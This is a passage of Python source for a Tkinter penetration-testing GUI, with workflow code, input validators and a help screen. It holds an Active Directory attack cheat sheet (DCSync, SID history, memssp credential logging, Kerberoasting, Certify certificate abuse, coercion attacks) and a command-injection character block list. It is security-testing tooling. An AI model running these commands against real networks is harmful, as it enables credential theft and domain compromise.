                "DSRM": "Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 2",
                "SID History": "Add-SIDHistory -TargetUser USER -SourceSID S-1-5-21-XXX-500",
                "Custom SSP": "misc::memssp (injects SSP for credential logging)"
            },
            "Privilege Escalation": {
                "DCSync": "lsadump::dcsync /domain:DOMAIN /user:krbtgt",
                "Unconstrained Delegation": "Get-NetComputer -Unconstrained",
                "Constrained Delegation": "Get-DomainUser -TrustedToAuth",
                "Resource-Based CD": "Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount COMPUTER$",
                "LAPS": "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd",
                "GPP Passwords": "Get-GPPPassword",
                "ASREPRoast": "Get-DomainUser -PreauthNotRequired",
                "Kerberoast": "Get-DomainUser -SPN"
            },
            "Reconnaissance": {
                "Domain Info": "Get-ADDomain",
                "Forest Info": "Get-ADForest",
                "Trust Relationships": "Get-ADTrust -Filter *",
                "Password Policy": "Get-ADDefaultDomainPasswordPolicy",
                "Fine-Grained Policy": "Get-ADFineGrainedPasswordPolicy -Filter *",
                "OUs": "Get-ADOrganizationalUnit -Filter *",
                "GPOs": "Get-GPO -All",
                "Service Accounts": "Get-ADServiceAccount -Filter *",
                "ADCS Templates": "certutil -TCAInfo"
            },
            "ADCS Attacks": {
                "Find Templates": "Certify.exe find /vulnerable",
                "ESC1": "Certify.exe request /ca:CA /template:Template /altname:Administrator",
                "ESC4": "Certify.exe request /ca:CA /template:Template (after modifying template)",
                "ESC8": "Coercer.py + ntlmrelayx.py to ADCS HTTP endpoint",
                "Request Cert": "Certify.exe request /ca:CA /template:Template",
                "Dump PFX": "Certify.exe download /ca:CA /id:ID"
            },
            "Coercion Attacks": {
                "PetitPotam": "PetitPotam.py LISTENER TARGET",
                "PrinterBug": "SpoolSample.exe TARGET LISTENER",
                "DFSCoerce": "dfscoerce.py -d DOMAIN -u USER -p PASS LISTENER TARGET",
                "ShadowCoerce": "ShadowCoerce.py LISTENER TARGET"
            }
        }

        self.lolol_categories = {
            "🐧 GTFOBins (Linux)": {
                "binaries": sorted(self.gtfobins_data.keys()),
                "functions": ["Shell", "File read", "File write", "SUID", "Sudo", "Reverse shell", "File upload", "File download"],
                "data": self.gtfobins_data
            },
            "🪟 LOLBAS (Windows)": {
                "binaries": sorted(self.lolbas_data.keys()),
                "functions": ["Download", "Execute", "Encode", "Decode", "DLL", "ADS", "Inline", "Persistence", "Reverse shell", "UAC Bypass", "Copy", "Inject"],
                "data": self.lolbas_data
            },
            "🏢 LOLAD (Active Directory)": {
                "binaries": list(self.lolad_data.keys()),
                "functions": list(set(func for techniques in self.lolad_data.values() for func in techniques.keys())),
                "data": self.lolad_data
            }
        }

    def on_lolol_category_changed(self, event):
        """Handle category change in LOLOL tab."""
        category = self.lolol_category.get()
        if category in self.lolol_categories:
            cat_data = self.lolol_categories[category]
            # Update binary list
            self.lolol_binary['values'] = cat_data['binaries']
            if cat_data['binaries']:
                self.lolol_binary.current(0)
            # Update function list
            self.lolol_function['values'] = cat_data['functions']
            if cat_data['functions']:
                self.lolol_function.current(0)
            # Show info
            self.show_lolol_info()

    def show_lolol_info(self):
        """Show LOLOL binary information based on selection."""
        category = self.lolol_category.get()
        binary = self.lolol_binary.get()
        function = self.lolol_function.get()

        if not category or not binary:
            return

        cat_data = self.lolol_categories.get(category, {})
        data = cat_data.get('data', {})
        binary_data = data.get(binary, {})

        self.lolol_output.delete("1.0", tk.END)

        if function in binary_data:
            info = binary_data[function]
            self.lolol_output.insert("1.0", f"Category: {category}\nBinary: {binary}\nFunction: {function}\n\n")
            self.lolol_output.insert(tk.END, f"{'═' * 50}\n\n")
            self.lolol_output.insert(tk.END, f"{info}\n\n")
            self.lolol_output.insert(tk.END, f"{'═' * 50}\n\n")
            self.lolol_output.insert(tk.END, "Replace RHOST/RPORT/TARGET/DOMAIN/USER/PASS with your values.")
        else:
            # Show all available functions for this binary
            self.lolol_output.insert("1.0", f"Category: {category}\nBinary: {binary}\n\n")
            self.lolol_output.insert(tk.END, f"{'═' * 50}\n")
            self.lolol_output.insert(tk.END, "Available techniques:\n\n")
            for func, cmd in binary_data.items():
                self.lolol_output.insert(tk.END, f"▶ {func}:\n{cmd}\n\n")

    def create_help_tab(self):
        """Create the Help tab with comprehensive guide."""
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(0, weight=1)
        frame.rowconfigure(1, weight=1)

        # Header
        header = tk.Label(
            frame,
            text="❓ HELP & DOCUMENTATION",
            font=("Courier", 14, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary
        )
        header.grid(row=0, column=0, sticky=tk.EW, padx=10, pady=15)

        # Help content
        help_text = scrolledtext.ScrolledText(
            frame, font=("Consolas", 11),
            bg="#1E1E1E", fg=self.text_color,
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            wrap=tk.WORD, relief=tk.FLAT
        )
        help_text.grid(row=1, column=0, sticky=tk.NSEW, padx=10, pady=10)

        help_content = """
╔══════════════════════════════════════════════════════════════════════╗
║                    RECON SUPERPOWER v3.0 GUIDE                      ║
╚══════════════════════════════════════════════════════════════════════╝

⚠️  LEGAL DISCLAIMER
This tool is for AUTHORIZED security testing only. Always obtain proper
authorization before scanning any systems.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 QUICK START
1. Select a tool from the left sidebar
2. Configure the options in the center panel
3. Click "RUN SCAN" to execute
4. View results in the output console on the right

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛠️  AVAILABLE TOOLS

🔍 NMAP - Network Scanner
   • Port scanning and service detection
   • NSE script support for vulnerability scanning
   • Multiple scan types (SYN, Connect, UDP, etc.)

📁 GOBUSTER - Directory Brute-forcer
   • Find hidden directories and files
   • DNS subdomain enumeration
   • Virtual host discovery

🔐 NIKTO - Web Vulnerability Scanner
   • Identify web server misconfigurations
   • Check for outdated software
   • Find dangerous files and scripts

💥 METASPLOIT - Auxiliary Scanners
   • SMB, SSH, HTTP version detection
   • Port scanning modules
   • Service enumeration

🌐 SHODAN - Device Search Engine
   • Search internet-connected devices
   • Requires API key (configure in Settings)
   • Find specific services and vulnerabilities

📡 DNSRECON - DNS Enumeration
   • Zone transfer attempts
   • Subdomain brute-forcing
   • DNS record enumeration

🖥️ ENUM4LINUX - SMB Enumeration
   • Windows/Samba enumeration
   • User and share discovery
   • Password policy extraction

🔎 GITHUB - OSINT
   • Search GitHub for sensitive data
   • Find exposed credentials
   • Discover configuration files

🦀 FEROXBUSTER - Web Discovery
   • Fast recursive content discovery
   • Extension filtering
   • Multi-threaded scanning

☁️ AWS S3 - Bucket Enumeration
   • Find misconfigured S3 buckets
   • Download exposed files
   • Permission testing

📦 TCPDUMP - Packet Capture
   • Network traffic analysis
   • Requires root/sudo privileges
   • BPF filter support

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🆕 NEW FEATURE TABS

🐚 SHELLZ - Reverse Shell Generator
   • Generate reverse shells in multiple languages
   • Bash, Python, Perl, PHP, Ruby, PowerShell
   • One-click copy to clipboard

🔐 ENCODERS
   • Base64, URL, Hex, Binary encoding
   • Hash generation (MD5, SHA1, SHA256)
   • ROT13 and Unicode encoding

🔓 DECODERS
   • Decode Base64, URL, Hex, Binary
   • JWT token decoder
   • Unicode and HTML entity decoding

🎭 LOLOL - Living Off The Land
   • GTFOBins-style reference
   • Privilege escalation techniques
   • File read/write with common binaries

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄 WORKFLOWS

Automated multi-tool reconnaissance:
1. Full Network Reconnaissance
2. Web Application Deep Scan
3. Domain Intelligence Gathering
4. Windows/SMB Enumeration
5. Cloud Asset Discovery
6. Quick Host Discovery

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⌨️  KEYBOARD SHORTCUTS

Ctrl+R    Run Scan
Ctrl+S    Save Output
Ctrl+L    Clear Console
Ctrl+F    Search in Output
Ctrl+C    Copy Selection
Ctrl+Q    Quit Application
ESC       Stop Running Scan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚙️  SETTINGS

Configure in the Settings tab:
• Shodan API Key
• Wordlist directory path
• Custom tools path
• Output directory
• Process timeout
• Max output lines
• UI preferences

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 EXPORT OPTIONS

• Text (.txt)
• JSON (.json)
• XML (.xml)
• HTML (.html)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔗 RESOURCES

• Nmap: https://nmap.org/book/man.html
• Shodan: https://www.shodan.io/search/filters
• GTFOBins: https://gtfobins.github.io/
• HackTheBox: https://www.hackthebox.eu/
• TryHackMe: https://tryhackme.com/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ Happy (Authorized) Reconnaissance! ⚡
"""

        help_text.insert("1.0", help_content)
        help_text.config(state=tk.DISABLED)

        return frame

    def create_workflows_tab(self):
        """Create the Workflows tab for automated multi-tool reconnaissance."""
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        
        # Configure grid weights for proper expansion
        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(5, weight=1)  # Preview frame should expand
        frame.rowconfigure(7, weight=0)  # Controls section
        frame.rowconfigure(8, weight=0)  # Progress section

        # Header
        header = tk.Label(
            frame,
            text="🔄 AUTOMATED WORKFLOWS",
            font=("Courier", 14, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary
        )
        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)

        # Description
        desc = tk.Label(
            frame,
            text="Chain multiple tools together for automated reconnaissance",
            font=("Courier", 9),
            fg=self.text_color,
            bg=self.bg_secondary
        )
        desc.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 15))

        # Workflow selector
        selector_label = tk.Label(
            frame,
            text="Select Workflow:",
            font=("Courier", 10, "bold"),
            fg=self.accent_green,
            bg=self.bg_secondary
        )
        selector_label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)

        # Create workflow options list
        workflow_options = [
            f"{wf['name']} - {wf['description'][:50]}..." if len(wf['description']) > 50 else f"{wf['name']} - {wf['description']}"
            for wf_id, wf in self.predefined_workflows.items()
        ]
        
        self.workflow_selector = ttk.Combobox(
            frame,
            values=workflow_options,
            state="readonly",
            font=("Courier", 9),
            width=60
        )
        self.workflow_selector.grid(row=2, column=1, sticky=tk.EW, padx=10, pady=5)
        self.workflow_selector.current(0)
        self.workflow_selector.bind("<<ComboboxSelected>>", self.on_workflow_selected)

        # Scan Mode selector (Passive vs Active)
        mode_frame = tk.Frame(frame, bg=self.bg_secondary)
        mode_frame.grid(row=3, column=0, columnspan=2, sticky=tk.W, padx=10, pady=10)

        mode_label = tk.Label(
            mode_frame,
            text="Scan Mode:",
            font=("Courier", 10, "bold"),
            fg=self.accent_green,
            bg=self.bg_secondary
        )
        mode_label.pack(side=tk.LEFT, padx=(0, 10))

        self.workflow_mode = tk.StringVar(value="both")

        passive_rb = tk.Radiobutton(
            mode_frame,
            text="🔍 Passive Only (No target interaction)",
            font=("Courier", 9),
            variable=self.workflow_mode,
            value="passive",
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            selectcolor=self.bg_primary,
            activebackground=self.bg_secondary,
            activeforeground=self.accent_cyan,
            command=self.on_workflow_selected
        )
        passive_rb.pack(side=tk.LEFT, padx=5)

        active_rb = tk.Radiobutton(
            mode_frame,
            text="⚡ Active Only (Direct target probing)",
            font=("Courier", 9),
            variable=self.workflow_mode,
            value="active",
            fg=self.accent_orange,
            bg=self.bg_secondary,
            selectcolor=self.bg_primary,
            activebackground=self.bg_secondary,
            activeforeground=self.accent_orange,
            command=self.on_workflow_selected
        )
        active_rb.pack(side=tk.LEFT, padx=5)

        both_rb = tk.Radiobutton(
            mode_frame,
            text="🔄 Both (Full reconnaissance)",
            font=("Courier", 9),
            variable=self.workflow_mode,
            value="both",
            fg=self.accent_green,
            bg=self.bg_secondary,
            selectcolor=self.bg_primary,
            activebackground=self.bg_secondary,
            activeforeground=self.accent_green,
            command=self.on_workflow_selected
        )
        both_rb.pack(side=tk.LEFT, padx=5)

        # Mode explanation
        mode_info = tk.Label(
            frame,
            text="💡 Passive: Uses third-party data (Shodan, GitHub) | Active: Sends packets to target",
            font=("Courier", 8),
            fg=self.text_muted,
            bg=self.bg_secondary
        )
        mode_info.grid(row=4, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(0, 10))

        # Preview frame
        preview_frame = tk.LabelFrame(
            frame,
            text=" 📋 Workflow Steps Preview ",
            font=("Courier", 10, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            relief=tk.FLAT
        )
        preview_frame.grid(row=5, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)

        # Steps text widget
        self.workflow_steps_text = tk.Text(
            preview_frame,
            height=10,
            font=("Courier", 9),
            bg=self.bg_tertiary,
            fg=self.text_color,
            wrap=tk.WORD,
            relief=tk.FLAT,
            padx=10,
            pady=10
        )
        self.workflow_steps_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Target input
        target_label = tk.Label(
            frame,
            text="Target:",
            font=("Courier", 10, "bold"),
            fg=self.accent_green,
            bg=self.bg_secondary
        )
        target_label.grid(row=6, column=0, sticky=tk.W, padx=10, pady=5)

        self.workflow_target = tk.Entry(
            frame,
            font=("Courier", 10),
            bg=self.bg_primary,
            fg=self.text_color,
            insertbackground=self.accent_green,
            selectbackground=self.accent_cyan,
            selectforeground=self.bg_primary,
            relief=tk.FLAT
        )
        self.workflow_target.grid(row=6, column=1, sticky=tk.EW, padx=10, pady=5)

        # Control buttons frame
        controls_frame = tk.Frame(frame, bg=self.bg_secondary)
        controls_frame.grid(row=7, column=0, columnspan=2, pady=15)

        # Run button
        self.workflow_run_btn = tk.Button(
            controls_frame,
            text="▶ RUN",
            font=("Courier", 10, "bold"),
            bg=self.accent_green,
            fg=self.bg_primary,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=self.run_workflow
        )
        self.workflow_run_btn.pack(side=tk.LEFT, padx=5)

        # Stop button
        self.workflow_stop_btn = tk.Button(
            controls_frame,
            text="⬛ STOP",
            font=("Courier", 10, "bold"),
            bg=self.accent_red,
            fg="white",
            activebackground="#cc0044",
            activeforeground="white",
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            state=tk.DISABLED,
            command=self.stop_workflow
        )
        self.workflow_stop_btn.pack(side=tk.LEFT, padx=5)

        # Workflow Guide button (in same row as controls)
        cheat_btn = tk.Button(
            controls_frame,
            text="📋 GUIDE",
            font=("Courier", 10, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("workflows")
        )
        cheat_btn.pack(side=tk.LEFT, padx=5)

        # Progress frame
        progress_frame = tk.LabelFrame(
            frame,
            text=" 📊 Workflow Progress ",
            font=("Courier", 10, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            relief=tk.FLAT
        )
        progress_frame.grid(row=8, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)

        # Progress label
        self.workflow_progress_label = tk.Label(
            progress_frame,
            text="Status: Ready to run\nStep: 0/0\nElapsed: 0s",
            font=("Courier", 9),
            fg=self.text_color,
            bg=self.bg_secondary,
            justify=tk.LEFT
        )
        self.workflow_progress_label.pack(anchor=tk.W, padx=10, pady=5)

        # Progress bar
        self.workflow_progress = ttk.Progressbar(
            progress_frame,
            mode='determinate',
            length=400
        )
        self.workflow_progress.pack(fill=tk.X, padx=10, pady=(0, 10))

        # Info label
        info_label = tk.Label(
            frame,
            text="💡 Tips: Workflows automate multi-tool reconnaissance. Target format depends on workflow.",
            font=("Courier", 8),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=500
        )
        info_label.grid(row=9, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        # Initialize with first workflow
        self.on_workflow_selected(None)

        return frame

    def on_workflow_selected(self, event=None):
        """Update workflow steps preview when selection changes."""
        try:
            selected_idx = self.workflow_selector.current()
            workflow_ids = list(self.predefined_workflows.keys())

            if selected_idx < 0 or selected_idx >= len(workflow_ids):
                # Default to first workflow if invalid selection
                selected_idx = 0
                try:
                    self.workflow_selector.current(0)
                except (tk.TclError, ValueError):
                    pass

            workflow_id = workflow_ids[selected_idx]
            workflow = self.predefined_workflows[workflow_id]

            # Get selected mode
            mode = self.workflow_mode.get()

            # Build steps list based on mode
            steps = []
            if mode in ("passive", "both"):
                passive_steps = workflow.get('passive_steps', [])
                for step in passive_steps:
                    steps.append(('🔍 PASSIVE', step))
            if mode in ("active", "both"):
                active_steps = workflow.get('active_steps', [])
                for step in active_steps:
                    steps.append(('⚡ ACTIVE', step))

            # Fallback to old 'steps' format if present
            if not steps and 'steps' in workflow:
                for step in workflow['steps']:
                    steps.append(('📌', step))

            # Update steps preview
            self.workflow_steps_text.config(state=tk.NORMAL)
            self.workflow_steps_text.delete('1.0', tk.END)

            steps_text = f"Workflow: {workflow['name']}\n"
            steps_text += f"{workflow['description']}\n"
            steps_text += f"Mode: {mode.upper()}\n\n"
            steps_text += "=" * 60 + "\n\n"

            if not steps:
                steps_text += "No steps available for selected mode.\n"
            else:
                for i, (step_type, step) in enumerate(steps, 1):
                    condition = step.get('condition', '')
                    condition_text = f" (if {condition})" if condition else ""

                    steps_text += f"{step_type} Step {i}: {step['name']}{condition_text}\n"
                    steps_text += f"  Tool: {step['tool'].upper()}\n"

                    # Show key config parameters
                    config = step['config']
                    for key, value in config.items():
                        if isinstance(value, bool):
                            value_str = "Yes" if value else "No"
                        else:
                            value_str = str(value)
                        steps_text += f"  • {key}: {value_str}\n"

                    steps_text += "\n"

            self.workflow_steps_text.insert('1.0', steps_text)
            self.workflow_steps_text.config(state=tk.DISABLED)

        except Exception as e:
            # Log error but don't crash
            print(f"Error in on_workflow_selected: {e}")
            import traceback
            traceback.print_exc()

    def validate_workflow_target(self, target, workflow_id):
        """
        FIX CRIT-1: Validate workflow target based on workflow requirements.
        Returns error message if invalid, None if valid.
        """
        # Determine expected format based on workflow
        if workflow_id in ['full_recon', 'quick_host', 'smb_enum']:
            # Requires IP address or hostname
            if not self.validate_target(target):
                return f"Invalid target format. Expected IP address or hostname.\nExamples: 192.168.1.1, scanme.nmap.org, 10.0.0.0/24"
        
        elif workflow_id == 'web_deep_scan':
            # Requires URL
            if not self.validate_url(target):
                return f"Invalid target format. Expected URL.\nExamples: http://example.com, https://192.168.1.1"
        
        elif workflow_id == 'domain_intel':
            # Requires domain name
            if not self.validate_domain(target):
                return f"Invalid target format. Expected domain name.\nExamples: example.com, subdomain.example.org"
        
        elif workflow_id == 'cloud_discovery':
            # Requires organization name or domain
            if not target or len(target) < 2 or len(target) > 100:
                return f"Invalid organization name. Must be 2-100 characters."
            # Basic sanitization
            if any(char in target for char in ['<', '>', ';', '|', '&', '$', '`']):
                return f"Invalid characters in organization name."
        
        # Additional length validation
        if len(target) > 500:
            return "Target too long. Maximum 500 characters."
        
        # Prevent command injection attempts
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '$(', '${']
        for char in dangerous_chars:
            if char in target:
                return f"Invalid character detected: {repr(char)}"
        
        return None  # Valid

    # NOTE: validate_extra_options is defined later in this file (around line 8817)
    # with more comprehensive security checks including shlex parsing and regex patterns.
    # The duplicate simpler version has been removed to avoid confusion.

    def validate_metasploit_options(self, options):
        """
        FIX CRIT-3: Validate Metasploit KEY=VALUE options.
        """
        if not options:
            return True
        
        # Split and validate each option
        for opt in options.split():
            # Must be KEY=VALUE format
            if '=' not in opt:
                return False
            
            key, value = opt.split('=', 1)
            
            # Validate key (whitelist allowed option names)
            allowed_keys = ['RHOSTS', 'RPORT', 'LHOST', 'LPORT', 'THREADS', 'VERBOSE', 
                           'SSL', 'TIMEOUT', 'USER', 'PASS', 'DOMAIN']
            if key.upper() not in allowed_keys:
                return False
            
            # Validate value (no shell metacharacters)
            if not self.validate_extra_options(value):
                return False
            
            # Max value length
            if len(value) > 100:
                return False
        
        return True
    
    def validate_file_extensions(self, extensions):
        """
        FIX HIGH-5: Validate file extensions for feroxbuster, gobuster.
        """
        if not extensions:
            return True
        
        # Split by comma
        ext_list = [e.strip() for e in extensions.split(',')]
        
        # Max 20 extensions
        if len(ext_list) > 20:
            return False
        
        # Validate each extension
        for ext in ext_list:
            # Must be alphanumeric + period
            if not re.match(r'^[a-zA-Z0-9.]+$', ext):
                return False
            # Max length per extension
            if len(ext) > 20:
                return False
        
        return True
    
    def validate_github_account(self, account):
        """
        FIX HIGH-4: Validate GitHub username/organization.
        """
        if not account:
            return True
        
        # GitHub username rules: alphanumeric and hyphens, max 39 chars
        if not re.match(r'^[a-zA-Z0-9\-]{1,39}$', account):
            return False
        
        # Can't start or end with hyphen
        if account.startswith('-') or account.endswith('-'):
            return False
        
        return True
    
    def validate_interface_name(self, interface):
        """
        FIX MED-5: Validate network interface name.
        """
        if not interface:
            return False
        
        # Interface names: alphanumeric + colon + period, max 15 chars
        if not re.match(r'^[a-zA-Z0-9:\.]{1,15}$', interface):
            return False
        
        return True
    
    def validate_nse_script(self, script):
        """
        FIX MED-7: Validate NSE script name.
        """
        if not script:
            return True
        
        # NSE script: alphanumeric, dash, underscore, period, max 100 chars
        if not re.match(r'^[a-zA-Z0-9\-_.]{1,100}$', script):
            return False
        
        # Must end with .nse if not a category
        categories = ['default', 'safe', 'intrusive', 'vuln', 'exploit', 'auth', 
                     'discovery', 'broadcast', 'dos', 'fuzzer', 'malware']
        if script not in categories and not script.endswith('.nse'):
            return False
        
        return True
    
    def validate_workflow_config_value(self, key, value):
        """
        FIX CRIT-4: Validate workflow configuration values.
        """
        # Numeric values
        if key in ['threads', 'timeout', 'depth', 'port']:
            if not isinstance(value, (int, str)):
                return False
            try:
                num = int(value) if isinstance(value, str) else value
                if num < 1 or num > 10000:
                    return False
            except (ValueError, TypeError):
                return False
        
        # File paths
        elif key in ['wordlist', 'bucket_list', 'grep_file']:
            if not isinstance(value, str):
                return False
            # Validate path
            if not self.validate_file_path(str(value), check_exists=False):
                return False
        
        # Extensions
        elif key in ['extensions']:
            if not isinstance(value, str):
                return False
            if not self.validate_file_extensions(str(value)):
                return False
        
        # Enum values
        elif key in ['scan_type', 'search_type', 'mode']:
            if not isinstance(value, str):
                return False
            # Must be alphanumeric
            if not re.match(r'^[a-zA-Z0-9_]{1,50}$', str(value)):
                return False
        
        # Boolean values
        elif key in ['ssl', 'all_enum']:
            if not isinstance(value, bool):
                return False
        
        # String values (queries, queries, etc.)
        else:
            if not isinstance(value, str):
                return False
            # Max length
            if len(str(value)) > 500:
                return False
        return True
  # Valid

    def run_workflow(self):
        """Execute the selected workflow."""
        # FIX HIGH-2: Thread-safe check and set
        with self.scan_lock:
            if self.workflow_running:
                messagebox.showwarning("Workflow Running", "A workflow is already running. Please stop it first.")
                return
            self.workflow_running = True

        try:
            # Get target
            target = self.workflow_target.get().strip()
            if not target:
                messagebox.showerror("Error", "Please enter a target (IP, domain, or URL)")
                self.workflow_running = False
                return

            # Get selected workflow
            selected_idx = self.workflow_selector.current()
            workflow_ids = list(self.predefined_workflows.keys())

            if selected_idx < 0:
                messagebox.showerror("Error", "Please select a workflow")
                self.workflow_running = False
                return

            workflow_id = workflow_ids[selected_idx]
            workflow = self.predefined_workflows[workflow_id]

            # Get selected mode (passive, active, or both)
            mode = self.workflow_mode.get()

            # Build steps list based on mode
            workflow_steps = []
            if mode in ("passive", "both"):
                passive_steps = workflow.get('passive_steps', [])
                workflow_steps.extend(passive_steps)
            if mode in ("active", "both"):
                active_steps = workflow.get('active_steps', [])
                workflow_steps.extend(active_steps)

            # Fallback to old 'steps' format if present
            if not workflow_steps and 'steps' in workflow:
                workflow_steps = workflow['steps']

            if not workflow_steps:
                messagebox.showwarning("No Steps", f"No steps available for mode: {mode.upper()}")
                self.workflow_running = False
                return

            # FIX CRIT-1: Validate target based on workflow requirements
            validation_error = self.validate_workflow_target(target, workflow_id)
            if validation_error:
                messagebox.showerror("Invalid Target", validation_error)
                self.workflow_running = False
                return

            # Initialize workflow execution
            self.current_workflow = workflow
            self.current_workflow_steps = workflow_steps  # Store the mode-specific steps
            self.current_workflow_mode = mode
            self.workflow_target_value = target  # Store validated target
            self.workflow_step_index = 0
            self.workflow_results = {}
            self.workflow_start_time = time.time()

            # Update UI
            self.workflow_run_btn.config(state=tk.DISABLED)
            self.workflow_stop_btn.config(state=tk.NORMAL)
            self.workflow_selector.config(state=tk.DISABLED)

            # Clear output
            self.output_text.delete('1.0', tk.END)
            self.append_output(f"{'=' * 60}\n")
            self.append_output(f"STARTING WORKFLOW: {workflow['name']}\n")
            self.append_output(f"Target: {target}\n")
            self.append_output(f"Mode: {mode.upper()}\n")
            self.append_output(f"Total Steps: {len(workflow_steps)}\n")
            self.append_output(f"{'=' * 60}\n\n")

            # Start workflow execution in separate thread
            workflow_thread = threading.Thread(target=self.execute_workflow_steps, daemon=True)
            workflow_thread.start()

        except Exception as e:
            # Reset workflow state on error
            self.workflow_running = False
            messagebox.showerror("Workflow Error", f"Failed to start workflow: {str(e)}")
            self.update_status(f"Workflow error: {str(e)}")

    def execute_workflow_steps(self):
        """Execute workflow steps sequentially."""
        import time

        workflow = self.current_workflow
        target = self.workflow_target_value
        # Use mode-specific steps stored during run_workflow
        workflow_steps = getattr(self, 'current_workflow_steps', workflow.get('steps', []))
        total_steps = len(workflow_steps)
        start_time = time.time()

        # FIX CRIT-2: Total workflow timeout (2 hours max)
        MAX_WORKFLOW_TIMEOUT = 7200  # 2 hours
        MAX_STEP_TIMEOUT = 1800  # 30 minutes per step

        for i, step in enumerate(workflow_steps):
            # Check if workflow stopped by user
            if not self.workflow_running:
                self.append_output("\n⚠️  Workflow stopped by user\n")
                break
            
            # FIX CRIT-2: Check total workflow timeout
            elapsed_total = time.time() - start_time
            if elapsed_total > MAX_WORKFLOW_TIMEOUT:
                self.append_output(f"\n❌ WORKFLOW TIMEOUT: Exceeded maximum execution time ({MAX_WORKFLOW_TIMEOUT}s)\n")
                break
            
            self.workflow_step_index = i + 1
            
            # Update progress
            self.root.after(0, lambda i=i: self.update_workflow_progress(i, total_steps, time.time() - start_time))
            
            # FIX HIGH-3: Check condition with proper evaluation
            condition = step.get('condition')
            if condition:
                condition_met = self.evaluate_workflow_condition(condition)
                if not condition_met:
                    self.append_output(f"\n⏭️  Step {i + 1} SKIPPED: {step['name']} (condition not met: {condition})\n")
                    continue
            
            # Execute step
            self.append_output(f"\n{'*' * 60}\n")
            self.append_output(f"▶ Step {i + 1}/{total_steps}: {step['name']}\n")
            self.append_output(f"{'*' * 60}\n\n")
            
            # FIX CRIT-2: Execute with timeout
            step_start = time.time()
            success = self.execute_workflow_step(step, target)
            step_elapsed = time.time() - step_start
            
            if step_elapsed > MAX_STEP_TIMEOUT:
                self.append_output(f"\n⚠️  Step {i + 1} exceeded timeout ({MAX_STEP_TIMEOUT}s)\n")
                if not messagebox.askyesno("Step Timeout", f"Step {i + 1} took too long. Continue anyway?"):
                    break
            
            if not success:
                self.append_output(f"\n❌ Step {i + 1} FAILED\n")
                if messagebox.askyesno("Step Failed", f"Step {i + 1} failed. Continue anyway?"):
                    continue
                else:
                    break
            else:
                self.append_output(f"\n✓ Step {i + 1} COMPLETED\n")
        
        # Workflow finished
        elapsed = time.time() - start_time
        self.append_output(f"\n{'=' * 60}\n")
        self.append_output(f"WORKFLOW COMPLETED\n")
        self.append_output(f"Executed: {self.workflow_step_index}/{total_steps} steps\n")
        self.append_output(f"Total Time: {int(elapsed)}s\n")
        self.append_output(f"{'=' * 60}\n")
        
        # Reset UI
        self.root.after(0, self.reset_workflow_ui)

    def execute_workflow_step(self, step, target):
        """Execute a single workflow step by actually running the tool."""
        # time already imported at module level
        
        tool = step['tool']
        config = step['config']
        
        try:
            # Don't switch tabs - keep user on Workflows tab to see progress
            # self.root.after(0, lambda: self.switch_tool(tool))
            # time.sleep(0.3)  # Not needed without tab switch
            
            # Set tool-specific inputs based on config
            success = self.configure_tool_for_workflow(tool, target, config)
            if not success:
                self.append_output(f"⚠️  Failed to configure {tool}\n")
                return False
            
            # Execute the tool
            self.append_output(f"Executing {tool.upper()}...\n")
            
            # Call run_scan which will execute the tool
            self.root.after(0, self.run_scan)
            time.sleep(0.5)  # Give run_scan time to start
            
            # Wait for tool to complete (check process status)
            max_wait = config.get('timeout', 300)  # Default 5 minutes
            waited = 0
            while self.is_running and waited < max_wait and self.workflow_running:
                time.sleep(1)
                waited += 1
            
            # Store result for condition evaluation
            if tool not in self.workflow_results:
                self.workflow_results[tool] = ""
            
            # Capture output from the text widget
            try:
